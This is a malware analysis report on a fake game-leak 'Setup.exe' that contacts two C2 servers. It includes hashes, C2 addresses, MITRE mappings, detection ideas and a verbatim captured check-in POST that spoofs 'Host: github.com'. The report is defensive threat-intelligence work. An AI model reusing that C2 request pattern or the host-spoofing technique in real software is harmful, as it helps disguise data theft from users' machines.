---
title: "Ren'Py game-leak lure: Go Setup.exe contacting two C2 servers"
description: "`Setup.exe` is a 4,479,344-byte 64-bit PE GUI executable built with Go 1.23.1, signed with a self-signed Authenticode certificate (`O=Vertex Grid`, valid from 2026-10-10). It is distributed inside `SGHL2026.zip` (146.0 MB) from a GitHub page presented as a game leak. Triage sample 261023-sptlkss16k scored 7/10."
authors: [Y2GX64]
category: Malware Analysis
date: 2026-10-25
---

*Analysis date: 23 to 25 October 2026. The findings come from two sandbox runs, two packet captures and static inspection of the extracted archive. The encrypted upload was not decrypted, so what the sample collects is not established.*

## Summary

A GitHub repository from a freshly made account offers the "leaked" build of an adult horror visual novel. The download is a 146 MB archive with a `Setup` folder that looks like a Ren'Py game: 23 files with game-style names such as `scripts.lic`, `patch_1.bnk` and `res.pak`, plus `Setup.exe`. Every one of those 23 files measures 8.000 bits of entropy per byte, so they are random filler and not game data. The only real file is `Setup.exe`, a 4.4 MB Go program.

Running `Setup.exe` shows nothing. In the sandbox it spawns no process, writes no file and sets no registry key. It does reach out, though. It resolves `orbixt.click` and gets no answer on port 7682, five times. It then resolves `darcy19.my`, connects to port 8312 on `134.122.94[.]188`, and makes three HTTP POSTs with a forged `Host: github.com` header. One of them carries a 1.28 KB encrypted blob.

Triage scores the run **7/10** and tags only "discovery." Its signatures about privilege tokens and tray windows belong to 7-Zip. The C2 behavior appears only in the packet captures.

| | |
|---|---|
| Sample | `Setup.exe`, PE32+ x86-64 GUI, Go 1.23.1, 4,479,344 B |
| SHA-256 | `f917057ccc62fdc30725a7c036c00a85909b49aa6f249703add11a00579bf0e6` |
| Archive | `SGHL2026.zip`, 146.0 MB, SHA-256 `810de9245e0594c2ed0b3ed7e8061c7e578c86852b42d4699311f36812c31e7e` |
| Triage sample | `261023-sptlkss16k`, score 7/10, tag "discovery" |
| Run A | win10v2004-20260911-en (350 s kernel, 329 s network) |
| Run B | win11-20260911-en (354 s kernel, 333 s network) |
| Packet captures | `win10.pcapng` (1,316 frames, 345.3 s) and `win11.pcapng` (282 frames, 333.3 s) |
| Signature | Authenticode, self-signed `O=Vertex Grid`, valid from 2026-10-10 |

## Concepts used in this sample

- **Filler padding.** Malware authors can bundle large amounts of meaningless data so that a download looks like a real game or installer. Here the padding makes up almost the whole archive. Whether it is meant to slip past upload or scan size limits is a guess.
- **Host header spoofing.** An HTTP request names the site it wants in the `Host` header, separately from the IP address it connects to. Sending `Host: github.com` to a server that is not GitHub makes proxy logs that match on that header look harmless. ATT&CK groups this under T1001.003, Protocol or Service Impersonation. It is not domain fronting (T1090.004), because there is no CDN involved.
- **C2 fallback.** Malware can carry more than one command-and-control address and try them in order. When the first never answers, the second takes over. ATT&CK tracks this as T1008.

## High-level overview

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The analyst's first sketch</div><div class="fig-sub">Extract, run, connect out</div></div><div class="fig-draw"><img src="/shared/img/renpy/flow.png" alt="Flow chart: user extracts the archive Setup.zip, runs Setup.exe, and Setup.exe connects back to its C2 server darcy19.my" width="165" height="300" loading="lazy" /></div><div class="fig-cap">This sketch shows the final hop only. The captures add a first, unanswered server (<code>orbixt.click</code>) that comes before <code>darcy19.my</code>.</div></figure>

## Indicators of compromise

### Files

`Setup.exe` was not observed writing, copying or deleting any file. Triage lists only the extracted executable and four sandbox memory dumps (PID 668 in run A, PID 1436 in run B), which are Triage artifacts and not files the sample wrote. The 24 other files in the folder come from the archive's file table and are not itemized by Triage. No legitimate library files were excluded because none are present.

| Role | Path |
|---|---|
| Self-copies, scripts, harvested data, exfil bundles | none observed |
| Archive | `C:\Users\Admin\AppData\Local\Temp\SGHL2026.zip` |
| Payload | `C:\Users\Admin\AppData\Local\Temp\SGHL2026\Setup\Setup.exe` |
| Filler (23 binary files) | `C:\Users\Admin\AppData\Local\Temp\SGHL2026\Setup\` with `animations.dll`, `api.pak`, `assets.wem`, `audio.res`, `bootstrap.wem`, `dlc.md5`, `driver.pak`, `driver.umap`, `global.cfg`, `installer.dat`, `lang.sys`, `launcher.dll`, `license.bank`, `license.wem`, `localization.ini`, `patch_1.bnk`, `physics.sys`, `res.pak`, `scripts.lic`, `settings.bin`, `uninstall.key`, `update_1.ini`, `update_1.res` |
| Note | `...\Setup\Password 2026.txt`, 24 bytes: "Archive password: 2026" |


<figure class="art-fig"><div class="fig-head"><div class="fig-title">The extracted folder</div><div class="fig-sub">`ls -l` of the Setup folder</div></div><div class="fig-draw"><img src="/shared/img/renpy/extracted-listing.jpg" alt="Terminal listing of the Setup folder showing Setup.exe at 4,479,344 bytes beside twenty-three large data files and Password 2026.txt" width="728" height="554" loading="lazy" /></div><div class="fig-cap">`Setup.exe` is the only file under 5 MB that is not a data blob. The largest, `scripts.lic` and `patch_1.bnk`, are 53.6 MB and 34.5 MB.</div></figure>

The padding totals about 151 MB uncompressed. The first MiB of each binary file measures 8.000 bits per byte (`audio.res`, 1,024 B, measures 7.81) with no recognizable header.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">Go build ID in Detect It Easy</div><div class="fig-sub">String found in Setup.exe</div></div><div class="fig-draw"><img src="/shared/img/renpy/die-go-build.jpg" alt="Detect It Easy string view of Setup.exe highlighting the Go build ID string" width="1100" height="246" loading="lazy" /></div><div class="fig-cap">The Go build ID string identifies the compiler. The analyst's report records `Setup.exe` as a packed 64-bit GUI executable.</div></figure>

The executable itself is Authenticode-signed by a certificate whose issuer and subject are both `O=Vertex Grid`, so it is self-signed and chains to nothing. The DigiCert entries in the signature are the timestamp chain. The signature was read from the file and not validated.

### Registry

| Key | Value | Purpose |
|---|---|---|
| `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters` | `Hostname` (queried) | Host fingerprinting; plausible input to `hwid`, unconfirmed |
| `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters` | `Domain` (queried) | Domain membership check |

No Run, RunOnce, service, scheduled-task or other autostart key was observed, and Triage records no registry writes for the sample. This is not a persistence finding. The "Checks installed software" signature lists no keys, so no further reads can be named.

### Mutexes

None observed. Triage lists no mutex for this sample in either run.

### Command lines

Verbatim from Triage. Both runs match except for the 7-Zip map and event identifiers.

```text
C:\Windows\Explorer.exe /idlist,,C:\Users\Admin\AppData\Local\Temp\SGHL2026.zip
C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\Admin\AppData\Local\Temp\SGHL2026\" -spe -an -ai#7zMap10696:96:7zEvent24722
"C:\Users\Admin\AppData\Local\Temp\SGHL2026\Setup\Setup.exe"
```

Run B uses `-ai#7zMap4990:96:7zEvent14688`. The `rundll32` line is the standard Windows shell COM server launch and is background noise. No `cmd`, `powershell`, `reg`, `schtasks` or `wmic` command ran, so whatever the sample collects it collects through in-process API calls.

### Network

| Indicator | Class | Role |
|---|---|---|
| `orbixt[.]click`, `178.105.61[.]106:7682` | C2, unreachable | First choice. DE. Resolves, then 25 SYNs per run and no response |
| `darcy19[.]my`, `134.122.94[.]188:8312` | C2 and exfil, active | Fallback. DE. nginx; every POST gets a 405 with `Allow: GET, HEAD` |
| `Host: github.com`, `/categories` | spoofed | Names GitHub while connecting to a different server; the analyst's `dig` shows github.com does not resolve to that IP |
| Chrome 117 on Windows NT 10.0 user agent | forged | Same fixed string on Windows 10 and 11 |
| `tag=5a4378fb90db39f09c7b18d1f314e645`, `hwid=61065ea193b62d39077040f1620db9bf` | client identifiers | Identical in both runs and both OS images |
| `c.pki.goog`, `ctldl.windowsupdate.com`, `ocsp.digicert.com`, `oneocsp.microsoft.com` | legitimate | Certificate status lookups, seen before and after the C2 activity |
| `dns.msftncsi.com` | background noise | Windows connectivity check at 165.5 s (A) and 235.9 s (B), in the middle of the failed orbixt attempts |


<figure class="art-fig"><div class="fig-head"><div class="fig-title">Where github.com actually lives</div><div class="fig-sub">dig, 23 October 2026, 16:31:50 UTC</div></div><div class="fig-draw"><img src="/shared/img/renpy/dig-github.jpg" alt="dig output resolving github.com to 20.205.243.166" width="783" height="374" loading="lazy" /></div><div class="fig-cap">`github.com` resolves to `20.205.243.166`.</div></figure>

<figure class="art-fig"><div class="fig-head"><div class="fig-title">What 134.122.94[.]188 resolves to</div><div class="fig-sub">dig, 23 October 2026, 16:31:42 UTC</div></div><div class="fig-draw"><img src="/shared/img/renpy/dig-ip.jpg" alt="dig output for 134.122.94.188 returning NXDOMAIN" width="1065" height="417" loading="lazy" /></div><div class="fig-cap">The lookup of the C2 address as a name returns NXDOMAIN, so nothing ties it to GitHub. The `Host` header and the destination IP do not belong together.</div></figure>

Triage's table shows only `c.pki.goog` as legitimate infrastructure; the captures show the rest of the Microsoft and certificate traffic. The `dns.msftncsi.com` lookup is the one most likely to be misread as the sample checking its connection. It is the operating system.

### Packet correlation

| Frames (A) | Frames (B) | Endpoint | Bytes | Phase |
|---|---|---|---|---|
| 1 to 1159 | 1 to 93 | Windows and Microsoft only | n/a | 1 to 3, no attributable activity |
| 1160 to 1222 | 94 to 136 | `178.105.61[.]106:7682` | 1,650 out, 0 in (25 SYNs of 66 B) | 4 |
| 1223 to 1227 | 179 to 183 | DNS, then `134.122.94[.]188:8312` handshake | n/a | 5 |
| 1228 to 1233 | 184 to 189 | POST 1 and 405 | 397 out, 333 in | 5 |
| 1235 to 1244 | 191 to 201 | POST 2 (1,577 B and 1,568 B body), ICMP type 3 code 4, 405 | about 1.9 KB out, 333 in | 6 |
| 1245 to 1250 | 202 to 207 | POST 3, 405 with 62-byte body, RST | 331 out, 229 in | 7 |
| 1225 to 1250 | 181 to 207 | Whole darcy19 conversation | 6,516 B and 6,562 B on the wire, 1.21 s and 1.42 s | 5 to 7 |
| 1251 to 1316 | 208 to 282 | Windows OCSP and telemetry | n/a | 8, no attacker activity |


The ICMP message in both captures (frames 1237 and 193) tells the sender the path MTU is 1376, so the large segment is resent in smaller pieces. This is a sandbox network artifact and not part of the malware's logic.

### Cross-run consistency

**Identical on both runs:** the `Setup.exe` hash and empty argument list, both C2 endpoints in the same order, five attempts on `orbixt.click` with the same 15 s, 26 s and 11 s timing, the full request sequence, the user agent, `tag` and `hwid`, and the absence of any write, mutex or persistence.

**Different:** the PID (668 and 1436), guest IP and ports, the 7-Zip identifiers, the delay before the first C2 packet (122.5 s and 194.2 s), the multipart boundary, the ciphertext bytes (1,282 and 1,281), the 62-byte ping replies, and capture size.

The `exp` field reads 1792144691 (2026-10-16 09:58:11 UTC) in run A and 1792160188 (14:16:28 UTC) in run B. The runs started about 72 seconds apart, so the 4 h 18 min gap is not a clock value, and its meaning is unknown.

Fixed identifiers and timing repeat across two Windows versions while the random parts change, which fits deterministic malware logic. The fallback order and fixed 11-second backoff are program behavior, because the sandbox has no reason to answer on one port and not another.

### Other indicators (related infrastructure)

The protocol shape matches the Remus stealer from the [Ashampoo campaign](/blog/ashampoo-campaign/): the same `tag`, `hwid`, `exp` and `access_token` fields, multipart `file` uploads with `type=0`, a spoofed `Host: github.com`, and a server that answers every request with a 405 and `Allow: GET, HEAD`. The path differs (`/workspaces` there, `/categories` here), and the loader differs (AutoIt3 there, Go here). This is a similarity in how the C2 protocol is designed. It does not establish that the two samples share an author.

## Execution flow

### 1. Delivery

This section comes from the analyst's own report, not from Triage or the packet captures. The lure is a repository named `Secret-Glory-Hole-Leaked-2026` under the account `propound294936-wanders` (hxxps://github[.]com/propound294936-wanders/Secret-Glory-Hole-Leaked-2026), presented as an unofficial leaked build of an adult horror visual novel. Whether the game exists was not checked. Download links point to a MediaFire file named `Setup.zip`, 146 MB, which showed 40 downloads on 25 October 2026.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The download page</div><div class="fig-sub">MediaFire, 25 October 2026</div></div><div class="fig-draw"><img src="/shared/img/renpy/mediafire.jpg" alt="MediaFire listing for Setup.zip showing 40 downloads and a size of 146 MB" width="1100" height="154" loading="lazy" /></div><div class="fig-cap">The file listing shows `Setup.zip`, 40 downloads and 146 MB. The sandbox archive is the same size.</div></figure>

The repository's instructions tell the user to extract the archive next to the game folder and describe the expected `Setup` layout. That layout matches the filler files in the archive, which helps the download look like a real Ren'Py build. `Setup.exe` is described as the main executable.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The repository's install steps</div><div class="fig-sub">Step 3: the folder structure to expect</div></div><div class="fig-draw"><img src="/shared/img/renpy/github-structure.jpg" alt="GitHub README excerpt telling the user to extract all files and listing a Setup folder with Setup.exe, scripts.lic, patch_1.bnk, res.pak and other game-style files" width="681" height="555" loading="lazy" /></div><div class="fig-cap">The README lists the same file names found in the archive, each with a plausible description.</div></figure>

Three things make the repository look disposable. The account has a default avatar, a randomly generated name and 9 contributions in the last year. It owns a second repository that hosts another leaked-game lure, which fits a pattern of fresh accounts publishing erotic Ren'Py games. And the repository carries an `activity.log` file with over 1,600 automated update entries.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The publishing account</div><div class="fig-sub">propound294936-wanders</div></div><div class="fig-draw"><img src="/shared/img/renpy/github-profile.jpg" alt="GitHub profile page for propound294936-wanders showing a generated avatar, two repositories and nine contributions in the last year" width="1100" height="453" loading="lazy" /></div><div class="fig-cap">Two public repositories, both leaked-game lures, and a nearly empty contribution graph.</div></figure>

<figure class="art-fig"><div class="fig-head"><div class="fig-title">`activity.log` in the repository</div><div class="fig-sub">Repeated automated updates</div></div><div class="fig-draw"><img src="/shared/img/renpy/activity-log.jpg" alt="The activity.log file in the repository showing a list of timestamped lines each reading auto update" width="742" height="690" loading="lazy" /></div><div class="fig-cap">The file has 1,673 lines, each reading `auto update` with a UTC timestamp, at roughly three to eight entries a day. The analyst reads it as a scheduled job that keeps the repository fresh so it ranks higher in search. That is an inference; the repository does not say so.</div></figure>

### 2. Execution timeline

Times are seconds from the first frame of each capture. Triage gives no process start times, so phases 1 to 3 cannot be placed inside the quiet period before the first C2 packet. The network flows are attributed to `Setup.exe` by inference: Triage's network table has no process column, but it is the only non-OS process that ran and the two C2 addresses appear nowhere else.

1. **Archive opened and extracted.** Explorer opens `SGHL2026.zip` from `%TEMP%`, and `7zG.exe` extracts it to `C:\Users\Admin\AppData\Local\Temp\SGHL2026\`. Nothing here touches the network. (T1204.002, User Execution; T1036, Masquerading)
2. **`Setup.exe` launched.** It starts with no arguments. No dialog, child process, file write or registry write follows.
3. **Host reconnaissance.** `Setup.exe` reads `Tcpip\Parameters\Hostname` and `Domain` from the registry. Triage also says "Checks installed software" but names no key. (T1012, Query Registry; T1016, System Network Configuration Discovery)
4. **Primary C2, unanswered.** DNS resolves `orbixt.click` to `178.105.61.106` in under 200 ms. Five TCP connections to port 7682 follow. Each sends a SYN plus four retransmissions over 15.0 s and gets no reply, then the sample waits 11 s. The start times in run A are 122.69, 148.75, 174.81, 200.88 and 226.92 s, which is 26.06 s apart. After the fifth failure it waits another 11.0 s. Frames: A 1160 to 1222, B 94 to 136. (T1008, Fallback Channels; T1571, Non-Standard Port)
5. **Fallback C2 check-in.** `darcy19.my` resolves to `134.122.94[.]188`. The handshake completes at once, and the sample sends `POST /categories` with `tag`, `exp` and `hwid` in a form body. The server returns the stock nginx **405 Not Allowed** page. Frames: A 1223 to 1233, B 179 to 189. (T1071.001, Web Protocols; T1001.003)
6. **Encrypted upload.** A second POST sends multipart data: an empty `access_token`, `type=0`, and a `file` field named `data` holding a 1,282-byte (A) or 1,281-byte (B) blob at 7.86 and 7.84 bits per byte. The reply is another 405. Frames: A 1235 to 1244, B 191 to 201. (T1041, Exfiltration Over C2 Channel; T1027)
7. **Ping and teardown.** A third POST sends `access_token=&type=ping`. The 405 reply has a 62-byte body of random-looking bytes in place of the 150-byte nginx page, and then the client resets the connection. Frames: A 1245 to 1250, B 202 to 207.
8. **Idle.** No further traffic to either server, no new attacker DNS names and no persistence in the rest of either capture.


The forged request looks like this in both runs. Only the multipart boundary and the `exp` value change.

```http
POST /categories HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Host: github.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Length: 89

tag=5a4378fb90db39f09c7b18d1f314e645&exp=1792144691&hwid=61065ea193b62d39077040f1620db9bf
```

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The check-in in Wireshark</div><div class="fig-sub">Frame 1229 in win10.pcapng</div></div><div class="fig-draw"><img src="/shared/img/renpy/wireshark-host.jpg" alt="Wireshark capture of win10.pcapng showing the TCP handshake to 134.122.94.188 port 8312, an HTTP POST /categories in frame 1229 with Host github.com, a 405 Not Allowed reply and an ICMP fragmentation-needed message in frame 1237" width="1100" height="473" loading="lazy" /></div><div class="fig-cap">Frame 1229 is the first POST. The packet details show `Host: github.com` and the Chrome user agent, and the 405 reply follows. Frame 1237 is the ICMP message described in section 7.</div></figure>

The blob is small, but a clean sandbox image has little to steal. The size says nothing about what the sample would take from a real user.

### Sandbox tags and heuristics reviewed

| Triage signature | Verdict |
|---|---|
| AdjustPrivilegeToken (`SeRestorePrivilege`, `SeSecurityPrivilege`) | **False positive.** Named process is `7zG.exe`, which requests these privileges to restore security descriptors while extracting. |
| FindShellTrayWindow | **False positive.** Also `7zG.exe`, from its progress dialog. |
| Executes dropped EXE | Accurate, but the EXE was extracted by 7-Zip. `Setup.exe` dropped nothing. |
| Reads the TCP/IP host and domain name | Real, low signal. Two registry reads attributed to the sample. |
| Checks installed software | Unverifiable. No indicator is listed. |
| Score 7/10, tag "discovery" | Understates. No C2 signature fired; the upload exists only in the captures. |

## Detection

- **Network:** an HTTP POST to a raw IP on a non-standard port such as 8312 with `Host: github.com`, the path `/categories` and the form fields `tag`, `exp` and `hwid`, from a process that is not a browser.
- **Network:** repeated SYNs to `178.105.61[.]106:7682` at a 26-second cadence, which matches no legitimate service.
- **Host:** a self-signed `Setup.exe` that runs from a `Temp` extraction folder beside 20 or more files with `.pak`, `.wem`, `.bnk` or `.lic` extensions that have no recognizable headers.
- **Signature:** an Authenticode certificate with `O=Vertex Grid` where issuer and subject match.
- **YARA:** `IOC_File_Setup_exe_SHA256` and `IOC_Net_Darcy19_Domain` work. The name-and-domain rule does not match this sample because the domain is not stored as a plain string, and no rule covers `orbixt.click`.
- **Hash:** `f917057ccc62fdc30725a7c036c00a85909b49aa6f249703add11a00579bf0e6`. A second archive, `SGHL2026BNUY.zip` (`51d08f594c8cb2727b44d5fb809ecbc29f8d615672da3814415feff85b443cb5`), contains an identical `Setup.exe`.

## MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Execution | T1204.002 User Execution: Malicious File | Fake game-leak archive run by the user |
| Defense Evasion | T1036 Masquerading | Analyst mapping |
| Discovery | T1012 Query Registry / T1016 System Network Configuration Discovery | In Triage's matrix |
| Command and Control | T1008 Fallback Channels | Two C2 servers; analyst mapping from the captures |
| Command and Control | T1571 Non-Standard Port / T1071.001 Web Protocols | Analyst mapping from the captures |
| Command and Control | T1001.003 Protocol Impersonation | Analyst mapping from the captures |
| Exfiltration | T1041 Exfiltration Over C2 Channel | Analyst mapping from the captures |
| Defense Evasion | T1027 Obfuscated Files or Information | Analyst mapping |

Triage's own matrix lists only T1012 and T1016. The rest are analyst mappings from the packet captures.

*Sources: Triage sample 261023-sptlkss16k (9 pages), `win10.pcapng`, `win11.pcapng`, `darcy19_setup.yar` and static inspection of the extracted archive. The screenshots come from the analyst's report in `SGHL2026_deliverables`, which also used Triage run `261023-szzkksts2p` (the passwordless archive) for its own analysis. A separate execution-chain report is published as a standalone page: https://claude.ai/artifact/S28RCk5wvKEuvGhAT6BA9h (private until shared).*

## Confidence and limits

**Observed.** The process list and command lines, the two registry reads, both C2 destinations, all three HTTP requests with their responses on both runs, and every figure in sections 6 and 7.

**Inferred.** That the network flows belong to `Setup.exe`; that the padding exists to inflate the archive; that `tag` is a build or campaign identifier; and that `hwid` is derived from something constant in Triage's images, since it repeats across Windows 10 and 11.

**Not established.** The contents of the upload, what the 62-byte ping replies mean (they arrive under a 405 and may be tasking, a key or noise), whether `orbixt.click:7682` ever serves a live server, how `hwid` is derived, and any payload after the check-in. The C2 strings and protocol field names appear in the binary neither as ASCII nor UTF-16, so they are encoded or built at runtime. Static recovery of them was not attempted here.

The delivery path (the GitHub repository, its account and the MediaFire link) comes from the analyst's own report and screenshots and is not corroborated by Triage or the captures. The reading of `activity.log` as an SEO job is an inference.
